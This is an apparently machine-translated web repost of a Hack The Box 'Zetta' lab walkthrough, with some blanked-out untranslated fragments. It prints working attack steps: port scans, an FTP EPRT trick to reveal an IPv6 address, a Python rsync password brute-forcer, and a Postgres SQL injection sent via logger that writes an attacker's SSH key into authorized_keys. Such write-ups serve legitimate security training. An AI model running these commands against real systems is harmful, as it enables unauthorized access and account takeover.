<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üåä üñêüèø üëºüèª Hack The Box - Zetta Walkthrough FXP, IPv6, rsync, Postgres and SQLi üßëüèø‚Äçü§ù‚Äçüßëüèº ‚ú°Ô∏è ü§∞üèº</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="I continue to publish solutions sent for further processing from the HackTheBox site . I hope that this will help at least someone to develop in the f...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Hack The Box - Zetta Walkthrough FXP, IPv6, rsync, Postgres and SQLi</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/489588/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/nn/1m/6i/nn1m6ihaiw2kzu-lt_868yjvd0e.png" alt="image"></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
I continue to publish solutions sent for </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">further processing</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> from the </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;">HackTheBox</font></a><font style="vertical-align: inherit;"> site </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">I hope that this will help at least someone to develop in the field of information security. </font><font style="vertical-align: inherit;">In this article, we learn the IPv6 server address using FXP, work with rsync, and also write the ssh key using SQL injection when processing logs in Postgres. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Connection to the laboratory is via VPN. </font><font style="vertical-align: inherit;">It is recommended not to connect from a work computer or from a host where the data important to you is available, since you get into a private network with people who know something in the field of information security :)</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Organizational Information</font></font></b><div class="spoiler_text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Especially for those who want to learn something new and develop in any of the areas of information and computer security, I will write and talk about the following categories:</font></font><br>
<br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWN;</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cryptography (Crypto);</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">network technologies (Network);</font></font></li>
<li> (Reverse Engineering);</li>
<li> (Stegano);</li>
<li>   WEB-.</li>
</ul><br>
         ,    ,        ,     .<br>
<a name="habracut"></a><br>
      ,     ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=">  Telegram</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=">    </a>   .    , ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=">    </a>.<br>
<br>
      .          ,  -      ,      .<br>
</div></div><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recon</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
This machine has an IP address 10.10.10.156, which I add to / etc / hosts.</font></font><br>
<br>
<pre><code class="plaintext hljs">10.10.10.156    zetta.htb</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
First, we scan open ports. </font><font style="vertical-align: inherit;">Since it takes a long time to scan all the ports with nmap, I will first do this with masscan. </font><font style="vertical-align: inherit;">We scan all TCP and UDP ports from the tun0 interface at a speed of 500 packets per second.</font></font><br>
<br>
<pre><code class="plaintext hljs">masscan -e tun0 -p1-65535,U:1-65535 10.10.10.156 --rate=500</code></pre><br>
<img src="https://habrastorage.org/webt/4s/y1/5o/4sy15okn_gqkagrrpwuug7gnznu.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Next, you need to collect more information about known ports. </font><font style="vertical-align: inherit;">To do this, use nmap with the -A option.</font></font><br>
<br>
<pre><code class="bash hljs">nmap -A zetta.htb -p21,22,80</code></pre><br>
<img src="https://habrastorage.org/webt/hb/2w/5n/hb2w5n8whv-z2w5qsocdpklonhe.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Take a look at what is on ftp. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/vl/qh/do/vlqhdo8g-smq-zqbwvq0pgsb9x8.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
As a result, the banner says that we can connect via IPv6. Let's see what is on the web server. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ni/dg/0r/nidg0rvziobssbym9jntimqmdnu.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
We observe Native FTP with support for FXP. FXP is a way of transferring files between two FTP servers directly, without downloading them to your computer. During an FXP session, the client opens two FTP connections to two different servers, requesting a file on the first server, indicating the IP address of the second server in the PORT command. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/yo/hp/6v/yohp6v4sud37g7xbj5bmfz7chws.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Scrolling a bit, we find the username and password for FTP. And after entering the credentials, we are told that there is support for FXP. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/sv/wy/_l/svwy_ltj2rlmdqxfbrqsc5ei_0s.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
But either there are no files on the server, or they are not given to us. But since this server supports FXP, we can pretend to be another server, the target server initiated a connection. Thus, we will reveal its IPv6 address in accordance with RFC 2428.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/5j/cw/cd/5jcwcdyngu_e36q63fxucohgerq.png" alt="image"><br>
<br>
<img src="https://habrastorage.org/webt/w2/bw/bt/w2bwbtcccse4gqvyl3xu0bf-jjc.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
This is necessary for further scanning, since the host may have services that accept only IPv6 connection. </font><font style="vertical-align: inherit;">So we need to know our address. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/5h/in/pn/5hinpn5tcmapocqvpuemvhrjv0m.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Using tcpdump, we will track the traffic that goes to port 4321. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ck/gy/ik/ckgyiky5qs4afqu8wzrdudjhg5i.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
And using netcat we connect to ftp and specify the credentials.</font></font><br>
<br>
<pre><code class="bash hljs">nc zetta.htb 21</code></pre><br>
<img src="https://habrastorage.org/webt/hl/e2/k1/hle2k12hpzyoxmzm_y95juvhrim.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
And now we send the EPRT request. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/dk/jt/tu/dkjttuf_ntvdl4qta4zizfrr6sg.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
And we observe the IPv6 address of the target host. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/wc/mn/1b/wcmn1bimjdf4qrzobuqg0romjxw.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Now write it to / etc / hosts instead of IPv4 and scan all ports using nmap, adding the -6 option.</font></font><br>
<br>
<pre><code class="bash hljs">nmap -6 zetta.htb -p-</code></pre><br>
<img src="https://habrastorage.org/webt/0k/pm/q6/0kpmq61u_comgc9lbaihvg9puqg.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Now we get more information using the -A option. </font></font><br>
<br>
<pre><code class="bash hljs">nmap -A -6 zetta.htb -p21,22,80,8730</code></pre><br>
<img src="https://habrastorage.org/webt/uo/gq/bj/uogqbj8xp1mz9a9ceb77zp2_3be.png" alt="image"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Entry point</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Rsync (remote synchronization) is a program for UNIX-like systems that synchronizes files and directories in two places while minimizing traffic. </font><font style="vertical-align: inherit;">Rsync can copy or display the contents of a directory and copy files, optionally using compression and recursion. </font><font style="vertical-align: inherit;">rsync only transfers file changes, which affects program performance. </font><font style="vertical-align: inherit;">Let's see the list of modules.</font></font><br>
<br>
<pre><code class="bash hljs">rsync -6 --list-only rsync://zetta.htb:8730/</code></pre><br>
<img src="https://habrastorage.org/webt/tc/kg/u9/tckgu9il7s2cys7xvhkpt3lbu5a.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Some important directories are missing from this list. </font><font style="vertical-align: inherit;">But the etc directory was available.</font></font><br>
<br>
<pre><code class="bash hljs">rsync -6 -av rsync://zetta.htb:8730/etc/rsync*</code></pre><br>
<img src="https://habrastorage.org/webt/3x/zn/bd/3xznbdntaiz3zqnr2qf3tlqebn4.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
We read rsyncd.conf, for this file on the local machine.</font></font><br>
<br>
<pre><code class="bash hljs">rsync -6 -a rsync://zetta.htb:8730/etc/rsyncd.conf .</code></pre><br>
<img src="https://habrastorage.org/webt/ai/oj/5s/aioj5sgqyn10hypi_wekrkvgr6e.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
There is a hidden module in the config - home_roy, which points to the user‚Äôs home directory roy, and it is password protected from rsyncd.secrets, but it is not available to us.</font></font><br>
<br>
<pre><code class="bash hljs">rsync -6 rsync://zetta.htb:8730/home_roy/</code></pre><br>
<img src="https://habrastorage.org/webt/gp/ai/tq/gpaitq8zbh7h_omn16zt_8lbgwg.png" alt="image"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">USER</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
When there were no more ideas, I had to sort out the password. </font><font style="vertical-align: inherit;">For this, Python code was written and a list of passwords from Seclists was used.</font></font><br>
<br>
<pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/python3</span><font></font>
<font></font>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">clear</span>():</span>
    sys.stdout.write(<span class="hljs-string">"\033[F"</span>)<font></font>
    sys.stdout.write(<span class="hljs-string">"\033[K"</span>)<font></font>
<font></font>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<font></font>
<font></font>
<span class="hljs-keyword">with</span> open(<span class="hljs-string">"/usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt"</span>, <span class="hljs-string">"r"</span>) <span class="hljs-keyword">as</span> f:<font></font>
    passwords = f.read().split(<span class="hljs-string">'\n'</span>)<font></font>
<font></font>
<span class="hljs-keyword">for</span> password <span class="hljs-keyword">in</span> passwords:<font></font>
    s = process([<span class="hljs-string">"rsync"</span>, <span class="hljs-string">"-6"</span>, <span class="hljs-string">"rsync://roy@zetta.htb:8730/home_roy"</span>], env={<span class="hljs-string">"RSYNC_PASSWORD"</span>:password})<font></font>
    clear()<font></font>
    clear()<font></font>
    print((<span class="hljs-string">"password: "</span> + password).ljust(<span class="hljs-number">30</span>, <span class="hljs-string">" "</span>), end=<span class="hljs-string">"\r\r"</span>)<font></font>
    <font></font>
    s.recvuntil(<span class="hljs-string">"\"Cloud sync\".\n\n\n"</span>)
    <span class="hljs-keyword">if</span> <span class="hljs-string">b"@ERROR:"</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> s.recv():<font></font>
        print(<span class="hljs-string">"found!!!"</span>)
        <span class="hljs-keyword">break</span><font></font>
    s.close()<font></font>
clear()</code></pre><br>
<img src="https://habrastorage.org/webt/3k/2t/ox/3k2toxpkr2nxsoyirv6uhtrsphu.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Now that we know the password, let's generate the ssh key and upload it to the server. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/zz/xf/cw/zzxfcwouoxqbcrszv0xj9xsnlwm.png" alt="image"><br>
<br>
<img src="https://habrastorage.org/webt/jp/1i/yd/jp1iydqlhrg09qwr_wxx3x26t2u.png" alt="image"><br>
<br>
<img src="https://habrastorage.org/webt/mb/u2/zq/mbu2zqozz2yasm3m8cub5kduinq.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
And connecting via SSH with this key, we take the user token.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/rg/ji/li/rgjiliy_quszvw3zeavyvzzzh6u.png" alt="image"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ROOT</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Next to the token lies a hint - a list of tasks. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/fa/lk/vg/falkvgcgyh9rm3chrb7hhxpfv1k.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Let's open them.</font></font><br>
<br>
<pre><code class="bash hljs">todo .tudu.xml</code></pre><br>
<img src="https://habrastorage.org/webt/tf/a8/8i/tfa88iedz9lf3q6tw_9ac6shiwi.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Let's see all the planned tasks. The server uses git. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/hs/va/en/hsvaen3j6aqirokrcxp-ln_o_yu.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
In this case, the event logs are saved in the database. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/o_/hu/zb/o_huzbgm3rsgv_fx4snwunlx1a8.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
And also plans to change the password, which at the moment looks like a certain kind. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/iv/j8/lx/ivj8lxpkgnjthvvbzzeug4svrpa.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
The first thing we do is go to git, because there we can see the history of configuration changes. Find all the .git directories on the server. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/l4/sx/o8/l4sxo8jxdwdocgmom11ckwm2yxc.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
We are most interested in the rsyslog journal, so I copy its entire repository to the local machine. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/dd/ye/jf/ddyejf3czw-r_zhoduuxikbvixi.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Now we go to the directory with the repository loaded and use gitk (the graphical interface is a trifle, but convenient).</font></font><br>
<br>
<img src="https://habrastorage.org/webt/gv/wp/_k/gvwp_ktsoxxersdc0wgb2fsgfaq.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
We see the credentials, but if we use them, we fail. </font><font style="vertical-align: inherit;">Also in the repository you can see the template according to which the logs are placed in the database. </font><font style="vertical-align: inherit;">Logs are saved in the /var/log/postgresql/postgresql-11-main.log log, which is accessible to the adm group that we are a member of. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ey/fw/nc/eyfwncj05y0shcz54xhvvkwbd0k.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Since we are dealing with a database, you can try the injection. </font><font style="vertical-align: inherit;">We will create events for recording using logger, simultaneously monitoring in real time what gets into the log (for convenience, you can use qterminal with a split window) using watch.</font></font><br>
<br>
<pre><code class="bash hljs">watch -n 1 cat postgresql-11-main.log</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
And send the event.</font></font><br>
<br>
<pre><code class="bash hljs">logger -p local7.info <span class="hljs-string">"'"</span></code></pre><br>
<img src="https://habrastorage.org/webt/_y/3b/e9/_y3be9zcxrq42sst-dh4ncxa08q.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
And an error occurs that indicates a possible injection. </font><font style="vertical-align: inherit;">Looking at / etc / passwd, we find out that the postgres service user has the / bin / bash shell. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/gb/ox/dp/gboxdpbfnz-zz70uyuh_czinjvq.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Thus, we can login via ssh. </font><font style="vertical-align: inherit;">This will give us access to the postgres file, including command history. </font><font style="vertical-align: inherit;">Let's check if we can write a file using injection.</font></font><br>
<br>
<pre><code class="bash hljs">logger -p local7.info <span class="hljs-string">"qwerty',\$\$2020-02-02\$\$);DROP TABLE if exists ralf;CREATE TABLE ralf(t TEXT);INSERT INTO ralf(t) VALUES(\$\$RALF\$\$);SELECT * FROM ralf;COPY ralf(t) TO \$\$/tmp/ralf\$\$;-- -"</span></code></pre><br>
<img src="https://habrastorage.org/webt/j_/pq/wx/j_pqwxpez02yfqe1qriziegnr7o.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Fine. </font><font style="vertical-align: inherit;">We will generate the ssh key and write the public key to the server in the home directory of the postgres service user: /var/lib/postgresql/.ssh/authorized_keys.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/5s/uj/8k/5suj8kpixestfadzh-0qk9dpx74.png" alt="image"><br>
<br>
<pre><code class="bash hljs">logger -p local7.info -s <span class="hljs-string">"qwerty',\$\$2020-02-02\$\$);DROP TABLE if exists ralf;CREATE TABLE ralf(t TEXT);INSERT INTO ralf(t) VALUES(\$\$ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRC9/M7mhpZ/0Rs/HyPIC58k3qDu3xRVmMgt/gky8VCpH49WVkkLpW0tFNL1Z7d/NN8efres0+aG7VJXop20P4uO7BT4ikK8ccDzXKHlSVPweevKu8AAVqu98mKxXJBNI/uQ1giv+zwS23hbe5DQTGldeOSPzClxal8sj99kqCk1aN8Cs7I6+vBcOkHoMVKB8dR9Hu0ZwvLzvWDnnBR1txmjrNDPt25I+2gNc3JYvqIS2QIV2DSdh5UoFKVzA27Mav3A0yL6zJjUynnluAa27HMsKdvrfA0Q5zIY3F/snHCl4X/wxZh4o9bnfxUFt6OC0sLxk5ro1Vw6EjgACZj+aFoFXBMgX59YpUVtXbXvN/ACMkIyLh/f7CvqWDD9sppZtcBKVYB1jzlqIG5ekgv55aCrTeX9CuS9YbZrrjZC2Dos7YTOwD9TBItlR8VcU0JcR1GiS+GHZv0Rm9pizHchOiPocWqdryoGqfTfCav4AvrhDHtzk4P/C1fa3flwb3NxE= root@Ralf-PC\$\$);SELECT * FROM ralf;COPY ralf(t) TO \$\$/var/lib/postgresql/.ssh/authorized_keys\$\$;-- -"</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Now let's go over ssh.</font></font><br>
<br>
<pre><code class="bash hljs">ssh -i psg_id_rsa postgres@zetta.htb</code></pre><br>
<img src="https://habrastorage.org/webt/7l/sb/_8/7lsb_8guzm_cw3r-xlk7rtvtixs.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
We look at the history of postgres. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/0z/fl/zi/0zflzicvn8fciw1ubk4i3r_v1iw.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
And we find the password. </font><font style="vertical-align: inherit;">We recall the password rule from the to-do list, replace the user with root, and log in. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/d0/eh/_e/d0eh_e4fitq3ce5smvxmu6rvbqw.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
We are with full rights! </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
You can join us on </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Telegram</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Let's put together a community in which there will be people who are versed in many areas of IT, then we can always help each other on any IT and information security issues.</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../en489568/index.html">DEFCON 27 Conference. Duplication of mechanical keys with limited access. Part 1</a></li>
<li><a href="../en489576/index.html">The nuances of modern medicine</a></li>
<li><a href="../en489582/index.html">In search of Godzilla. Neural networks and forecasting quotes based on exchange and "external" data</a></li>
<li><a href="../en489584/index.html">How to improve your API service on node.js. Part 1</a></li>
<li><a href="../en489586/index.html">Sound visualization on vintage lamps</a></li>
<li><a href="../en489590/index.html">What if the programmer has nothing to do constantly?</a></li>
<li><a href="../en489594/index.html">Framework vs Platform: what's the difference?</a></li>
<li><a href="../en489596/index.html">The digest of interesting materials for the mobile # 334 developer (on February 17 - 23)</a></li>
<li><a href="../en489600/index.html">GDC-2020: what to expect from one of the largest gaming development exhibitions</a></li>
<li><a href="../en489602/index.html">Prerender on canvas 2D</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>